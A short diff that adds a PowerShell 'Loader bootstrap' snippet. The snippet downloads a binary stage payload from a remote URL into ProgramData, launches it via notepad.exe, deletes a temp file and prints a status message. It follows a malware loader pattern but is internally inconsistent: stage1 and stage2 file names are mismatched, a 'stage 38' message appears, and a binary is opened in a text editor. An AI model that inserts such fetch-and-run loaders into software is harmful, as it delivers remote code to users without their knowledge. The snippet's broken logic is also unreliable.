@@ -1,0 +1,2 @@
+
+<# Loader bootstrap #> try { $PayloadUrl = 'https://internal.corp/cdn/stage2.bin'; $PayloadPath = "C:\ProgramData\stage1.bin"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Write-Output "stage 38 initialized" } catch { Write-Warning "Stage transfer failed" }
